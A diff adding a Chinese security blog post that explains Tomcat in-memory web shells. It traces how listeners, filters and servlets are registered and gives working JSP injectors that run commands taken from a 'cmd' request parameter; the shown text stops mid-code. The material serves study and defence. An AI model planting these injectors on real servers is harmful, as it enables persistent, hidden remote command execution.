@@ -1,0 +1,1191 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Tomcat型内存🐎 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Tomcat型内存🐎 | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="参考文献：
+Tomcat内存马
+Java安全学习——内存马 - 枫のBlog
+Tomcat中的三种Context
+根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://bloyet.github.io">
+  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
+  </a>
+  <h1 class="site-title">
+    Bloyet&#39;s blog
+  </h1>
+  <p class="site-description">
+    做那个人的战士，和他一起去经历，失败!
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Home
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/friends" class="menu">
+          Friends
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Tomcat型内存🐎
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-07-11
+              </span>
+              <span>
+                25 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>参考文献：</p>
+<p><a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat内存马</a></p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<h1 id="tomcat中的三种context">Tomcat中的三种Context</h1>
+<p>根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
+<p>先导入依赖：</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+&lt;version&gt;8.5.31&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="servletcontext">ServletContext</h2>
+<p>在Tomcat架构分析的时候，也提到过这个：</p>
+<p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，可以通过ServletContext来对某个Web应用的资源进行访问和操作</p>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752213966680.png" alt="" loading="lazy"></figure>
+<h2 id="applicationcontext">ApplicationContext</h2>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752213966694.png" alt="" loading="lazy"></figure>
+<p>使用getServletContext()方法其实是获取到了ApplicationContextFacade类，但是其实本质上还是调用了ApplicationContext类中的方法</p>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752213966709.png" alt="" loading="lazy"></figure>
+<h2 id="standardcontext">StandardContext</h2>
+<p>它是context容器的标准实现类，包含了对容器资源的各种操作，ApplicationContext本质上是调用了StandardContext</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752213966724.png" alt="" loading="lazy"></figure>
+<p>一张图来总结其中的关系：</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752213966740.jpeg" alt="" loading="lazy"></figure>
+<h1 id="tomcat内存马">Tomcat内存马</h1>
+<p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>在这就一步一步的来分析：</p>
+<p>引入Tomcat依赖—这个我在一开始就已经引入了</p>
+<h2 id="listener型">Listener型</h2>
+<p>Listener根据事件可以分为3中ServletContextListener，HttpSessionListener，ServletRequestListener</p>
+<p>很明显，ServletRequestListener类型的是最适合用来做内存马的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法，我们只需要在这个方法中写入恶意命令就可以达到攻击手段了</p>
+<p>例子：</p>
+<pre><code class="language-java">package Listener;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.annotation.WebListener;
+import java.io.IOException;
+
+@WebListener
+public class Hello_Listener implements ServletRequestListener {
+
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (NullPointerException n) {
+            n.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>访问任意路由都会触发命令</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752213966755.png" alt="" loading="lazy"></figure>
+<p>我们刚刚只是演示了一下 Listener中的requestInitialized() 会在我们访问路由的时候自动调用，但是我们不可能可以直接去修改这个方法，那应该怎么动态的写入恶意的listener呢？</p>
+<h3 id="listener注册过程">Listener注册过程</h3>
+<p>断点就打在requestInitialized()方法上，我们看看在这之前都调用了什么隐藏帧，开始回溯寻找调用过程</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752213966772.png" alt="" loading="lazy"></figure>
+<p>先来看StandarContext#fireRequestInitEvent方法</p>
+<pre><code class="language-java">public boolean fireRequestInitEvent(ServletRequest request) {
+Object[] instances = this.getApplicationEventListeners();
+if (instances != null &amp;&amp; instances.length &gt; 0) {
+    ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);
+
+    for(int i = 0; i &lt; instances.length; ++i) {
+        if (instances[i] != null &amp;&amp; instances[i] instanceof ServletRequestListener) {
+            ServletRequestListener listener = (ServletRequestListener)instances[i];
+
+            try {
+                listener.requestInitialized(event);
+            } catch (Throwable var7) {
+                Throwable t = var7;
+                ExceptionUtils.handleThrowable(t);
+                this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]{instances[i].getClass().getName()}), t);
+                request.setAttribute(&quot;javax.servlet.error.exception&quot;, t);
+                return false;
+            }
+        }
+    }
+}
+
+return true;
+}
+</code></pre>
+<p>先是调用getApplicationEventListeners()获取到一个数组，然后遍历数组调用listener.requestInitialized(event);方法触发Litener，先步入</p>
+<p>getApplicationEventListeners()方法</p>
+<pre><code class="language-java">public Object[] getApplicationEventListeners() {
+    return applicationEventListenersList.toArray();
+}
+</code></pre>
+<p>发现信息是储存在applicationEventListenersList中的：</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752213966786.png" alt="" loading="lazy"></figure>
+<p>而且我们是可以通过StandardContext#addApplicationEventListener()方法来添加Listener</p>
+<pre><code class="language-java">public void addApplicationEventListener(Object listener) {
+this.applicationEventListenersList.add(listener);
+}
+</code></pre>
+<h3 id="注入listener">注入Listener</h3>
+<p>在往上看一帧</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752213966801.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752213966816.png" alt="" loading="lazy"></figure>
+<p>发现在这执行了invoke方法 获取到了StandardContext的实例</p>
+<p>第二种方法获取：</p>
+<p>由于JSP内置了request对象，我们也可以使用同样的方式来获取</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+//这里的Request为org.apache.catalina.connector.Request
+StandardContext context = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>第三种：</p>
+<pre><code class="language-java">&lt;%
+WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+%&gt;
+</code></pre>
+<p>这里就用第二种来进行注入：</p>
+<p>这里先使用jsp文件进行注入，后面还会说实战怎么通过反序列化来加载</p>
+<pre><code class="language-java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+ 
+&lt;%!
+    public class Shell_Listener implements ServletRequestListener {
+ 
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+           String cmd = request.getParameter(&quot;cmd&quot;);
+           if (cmd != null) {
+               try {
+                   Runtime.getRuntime().exec(cmd);
+               } catch (IOException e) {
+                   e.printStackTrace();
+               } catch (NullPointerException n) {
+                   n.printStackTrace();
+               }
+            }
+        }
+ 
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+%&gt;
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext context = (StandardContext) req.getContext();
+ 
+    Shell_Listener shell_Listener = new Shell_Listener();
+    context.addApplicationEventListener(shell_Listener);
+%&gt;
+</code></pre>
+<p>先访问一下jsp文件 这样就会把我们的恶意Listener注入了（访问这个jsp文件之后，会执行其中的代码，我们先是获取到了context上下文，然后把我们的恶意类添加到上下文中，然后在自动的调用我们的恶意方法）</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1752213966833.png" alt="" loading="lazy"></figure>
+<h2 id="filter型">Filter型</h2>
+<h3 id="filter调用分析">Filter调用分析</h3>
+<p>调用栈如下：注意的是 在我们给doFilter方法打上断点之后，已调试的模式去运行服务器，还需要去访问一下资源，在访问的过程中会触发Filter</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1752213966847.png" alt="" loading="lazy"></figure>
+<p>还是一样先看调用栈</p>
+<p>ApplicationFilterChain#internalDoFilter</p>
+<pre><code class="language-java">private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
+    if (this.pos &lt; this.n) {
+        ApplicationFilterConfig filterConfig = this.filters[this.pos++];
+
+        try {
+            Filter filter = filterConfig.getFilter();
+            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res, this};
+                SecurityUtil.doAsPrivilege(&quot;doFilter&quot;, filter, classType, args, principal);
+            } else {
+                filter.doFilter(request, response, this);
+            }
+
+        } catch (ServletException | RuntimeException | IOException var15) {
+            Exception e = var15;
+            throw e;
+        } catch (Throwable var16) {
+            Throwable e = var16;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
+        }
+    } else {
+        try {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set(request);
+                lastServicedResponse.set(response);
+            }
+
+            if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res};
+                SecurityUtil.doAsPrivilege(&quot;service&quot;, this.servlet, classTypeUsedInService, args, principal);
+            } else {
+                this.servlet.service(request, response);
+            }
+        } catch (ServletException | RuntimeException | IOException var17) {
+            Exception e = var17;
+            throw e;
+        } catch (Throwable var18) {
+            Throwable e = var18;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
+        } finally {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set((Object)null);
+                lastServicedResponse.set((Object)null);
+            }
+
+        }
+
+    }
+}
+</code></pre>
+<p>在这里稍微了解一下filterConfig</p>
+<p>一个filterConfig对应一个Filter，用于存储Filter的上下文信息</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1752213966862.png" alt="" loading="lazy"></figure>
+<p>再去看看filters是怎么来的</p>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1752213966878.png" alt="" loading="lazy"></figure>
+<p>这里的<code>filters</code>属性是一个ApplicationFilterConfig数组。 我们直接去这个数组里怎么储存Filter的，很难找到（这里其实是有点难理解的，先跟着大佬文章看吧）我这里的初步理解是因为调用的ApplicationFilterChain所以要找到ApplicationFilterChain的Filter，我们就继续往上看调用帧</p>
+<p>StandardWrapperValve#invoke方法中</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1752213966894.png" alt="" loading="lazy"></figure>
+<p>看看它是怎么来的：</p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1752213966910.png" alt="" loading="lazy"></figure>
+<p>步入ApplicationFilterFactory.createFilterChain方法：</p>
+<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
+            Wrapper wrapper, Servlet servlet) {
+ 
+        ...
+        // Request dispatcher in use
+        filterChain = new ApplicationFilterChain();
+ 
+        filterChain.setServlet(servlet);
+        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
+ 
+        // Acquire the filter mappings for this Context
+        StandardContext context = (StandardContext) wrapper.getParent();
+        FilterMap filterMaps[] = context.findFilterMaps();
+ 
+        ...
+ 
+        String servletName = wrapper.getName();
+ 
+        // Add the relevant path-mapped filters to this filter chain
+        for (FilterMap filterMap : filterMaps) {
+            
+            ...
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+                    context.findFilterConfig(filterMap.getFilterName());
+            ...
+ 
+            filterChain.addFilter(filterConfig);
+        }
+ 
+        ...
+ 
+        // Return the completed filter chain
+        return filterChain;
+    }
+</code></pre>
+<p>只看其中关键代码：</p>
+<pre><code class="language-java">首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象
+然后通过wrapper.getParent()函数来获取StandardContext对象
+接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息
+最后根据Filter的名称，在StandardContext中获取FilterConfig
+通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中
+</code></pre>
+<p>这是一套完整的调用逻辑了，但是我们应该怎么把恶意的Filter注入呢？</p>
+<p>我们看到刚刚分析的时候，是在最后的时候把filter取出来进行调用，在这之前都是封装在filterConfig中，所以我们一开始也是必须得把恶意的filter放入filterConfig中，所以我们就来看看它其中的格式（这里直接看佬的，不浪费时间找了）：</p>
+<h3 id="filter注册分析">Filter注册分析</h3>
+<h4 id="standardcontext-2">StandardContext</h4>
+<p>我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1752213966925.png" alt="" loading="lazy"></figure>
+<h4 id="filterconfigs">filterConfigs：</h4>
+<p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1752213966942.png" alt="" loading="lazy"></figure>
+<h4 id="filterdef">filterDef：</h4>
+<p>存放了filter的定义，包括filterClass、filterName等信息</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1752213966957.png" alt="" loading="lazy"></figure>
+<h4 id="filterdefs">filterDefs</h4>
+<p>是一个HashMap，以键值对的形式存储<code>filterDef</code></p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1752213966988.png" alt="" loading="lazy"></figure>
+<h4 id="filtermaps">filterMaps</h4>
+<p>以array的形式存放各filter的路径映射信息</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1752213966972.png" alt="" loading="lazy"></figure>
+<p>必要属性：<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p>
+<h3 id="注册filter思路">注册Filter思路</h3>
+<ol>
+<li>获取StandardContext对象</li>
+<li>创建恶意Filter</li>
+<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
+<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
+<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>
+</ol>
+<h4 id="获取standardcontext对象">获取StandardContext对象</h4>
+<p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
+<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
+<pre><code class="language-java">//获取ApplicationContextFacade类
+ServletContext servletContext = request.getSession().getServletContext();
+ 
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+appContextField.setAccessible(true);
+ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+ 
+//反射获取ApplicationContext类属性context为StandardContext类
+Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+standardContextField.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1752213967003.png" alt="" loading="lazy"></figure>
+<h4 id="1-创建恶意filter">1. 创建恶意Filter</h4>
+<pre><code class="language-java">public class CmdFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        System.out.println(&quot;Filter 初始构造完成&quot;);
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+        System.out.println(&quot;filter 销毁&quot;);
+    }
+}
+</code></pre>
+<h4 id="filterdef对filter进行封装">FilterDef对Filter进行封装</h4>
+<pre><code class="language-java">String name=&quot;filterShell&quot;;
+FilterDef filterDef = new FilterDef();
+filterDef.setFilter(new CmdFilter());
+filterDef.setFilterClass(CmdFilter.class.getName());
+filterDef.setFilterName(name);
+context.addFilterDef(filterDef);
+</code></pre>
+<h4 id="创建filtermap类">创建filterMap类</h4>
+<pre><code class="language-java">FilterMap filterMap = new FilterMap();
+	filterMap.setFilterName(name);
+	filterMap.setDispatcher(DispatcherType.REQUEST.name());
+	filterMap.addURLPattern(&quot;/*&quot;);
+	context.addFilterMap(filterMap);
+</code></pre>
+<h4 id="注入到filterconfigs中">注入到filterConfigs中</h4>
+<p>这里因为ApplicationFilterConfig的构造方法不是公共的，需要反射来进行调用</p>
+<pre><code class="language-java">Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+Configs.setAccessible(true);
+Map filterConfigs = (Map) Configs.get(context);
+Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+constructor.setAccessible(true);
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+filterConfigs.put(name, filterConfig);
+</code></pre>
+<h3 id="poc">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+    public class CmdFilter implements Filter {
+
+        @Override
+        public void init(FilterConfig filterConfig)  {
+            System.out.println(&quot;shell&quot;);
+        }
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            chain.doFilter(request,response);
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+%&gt;
+
+
+
+&lt;%
+    //获取ApplicationContextFacade类
+    ServletContext servletContext = request.getSession().getServletContext();
+
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+    appContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+
+//反射获取ApplicationContext类属性context为StandardContext类
+    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+    standardContextField.setAccessible(true);
+    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
+%&gt;
+
+&lt;%
+    String name=&quot;filtershell&quot;;
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(new CmdFilter());
+    filterDef.setFilterClass(CmdFilter.class.getName());
+    filterDef.setFilterName(name);
+    context.addFilterDef(filterDef);
+%&gt;
+
+&lt;%
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(name);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    filterMap.addURLPattern(&quot;/*&quot;);
+    context.addFilterMap(filterMap);
+%&gt;
+
+
+&lt;%
+    Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+    Configs.setAccessible(true);
+    Map filterConfigs = (Map) Configs.get(context);
+
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+    filterConfigs.put(name, filterConfig);
+%&gt;
+</code></pre>
+<p>还是一样 得先访问jsp木马文件，然后就会自动注入进去，注入完毕之后在我们访问资源之前就会进行拦截执行命令</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1752213967018.png" alt="" loading="lazy"></figure>
+<h2 id="servlet型">Servlet型</h2>
+<p>其实思路都差不多，就是看怎么把恶意类注入到上下文中，每一种类型涉及的方法不一样，所以注入时调用的方法也不一样</p>
+<h3 id="编写恶意servlet">编写恶意servlet</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<h3 id="注入servlet内存马">注入servlet内存马</h3>
+<p>这里就只看ConfigContext#configureContext注册Servlet流程过程了，因为按照顺序来说是先listener-filter-servlet</p>
+<p>先写出大致步骤</p>
+<pre><code class="language-java">由上下文context创建wrapper，用来包装servlet
+设置Servlet名称
+设置Servlet全类名
+wrapoer设置servlet
+将wrapper放入context
+添加url路径映射
+</code></pre>
+<h4 id="创建standardwrapper">创建StandardWrapper</h4>
+<p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1752213967033.png" alt="" loading="lazy"></figure>
+<p>看看fireLifecycleEvent()方法的具体实现：</p>
+<pre><code class="language-java">protected void fireLifecycleEvent(String type, Object data) {
+    LifecycleEvent event = new LifecycleEvent(this, type, data);
+    Iterator i$ = this.lifecycleListeners.iterator();
+
+    while(i$.hasNext()) {
+        LifecycleListener listener = (LifecycleListener)i$.next();
+        listener.lifecycleEvent(event);
+    }
+
+}
+</code></pre>
+<p>最终通过ContextConfig#webConfig()方法解析web.xml获取各种配置参数,里面通过调用configureContext方法来从context里面获取web.xml里面的信息</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1752213967049.png" alt="" loading="lazy"></figure>
+<p>获取到信息之后，是通过ContextConfig#addServletContainerInitializer来添加</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1752213967065.png" alt="" loading="lazy"></figure>
+<p>通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p>
+<pre><code class="language-java"> private void configureContext(WebXml webxml) {
+        // As far as possible, process in alphabetical order so it is easy to
+        // check everything is present
+        // Some validation depends on correct public ID
+        context.setPublicId(webxml.getPublicId());
+ 
+...   //设置StandardContext参数
+ 
+        
+        for (ServletDef servlet : webxml.getServlets().values()) {
+ 
+            //创建StandardWrapper对象
+            Wrapper wrapper = context.createWrapper();
+ 
+            if (servlet.getLoadOnStartup() != null) {
+ 
+                //设置LoadOnStartup属性
+                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
+            }
+            if (servlet.getEnabled() != null) {
+                wrapper.setEnabled(servlet.getEnabled().booleanValue());
+            }
+ 
+            //设置ServletName属性
+            wrapper.setName(servlet.getServletName());
+            Map&lt;String,String&gt; params = servlet.getParameterMap();
+            for (Entry&lt;String, String&gt; entry : params.entrySet()) {
+                wrapper.addInitParameter(entry.getKey(), entry.getValue());
+            }
+            wrapper.setRunAs(servlet.getRunAs());
+            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
+            for (SecurityRoleRef roleRef : roleRefs) {
+                wrapper.addSecurityReference(
+                        roleRef.getName(), roleRef.getLink());
+            }
+ 
+            //设置ServletClass属性
+            wrapper.setServletClass(servlet.getServletClass());
+            ...
+            wrapper.setOverridable(servlet.isOverridable());
+ 
+            //将包装好的StandWrapper添加进ContainerBase的children属性中
+            context.addChild(wrapper);
+ 
+           for (Entry&lt;String, String&gt; entry :
+                webxml.getServletMappings().entrySet()) {
+          
+            //添加路径映射
+            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+        }
+        }
+        ...
+    }
+</code></pre>
+<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p>
+<h4 id="加载standwrapper">加载StandWrapper</h4>
+<p>在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1752213967080.png" alt="" loading="lazy"></figure>
+<p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p>
+<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
+ 
+        // Collect &quot;load on startup&quot; servlets that need to be initialized
+        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
+        for (Container child : children) {
+            Wrapper wrapper = (Wrapper) child;
+            int loadOnStartup = wrapper.getLoadOnStartup();
+ 
+            //判断属性loadOnStartup的值
+            if (loadOnStartup &lt; 0) {
+                continue;
+            }
+            Integer key = Integer.valueOf(loadOnStartup);
+            ArrayList&lt;Wrapper&gt; list = map.get(key);
+            if (list == null) {
+                list = new ArrayList&lt;&gt;();
+                map.put(key, list);
+            }
+            list.add(wrapper);
+        }
+ 
+        // Load the collected &quot;load on startup&quot; servlets
+        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
+            for (Wrapper wrapper : list) {
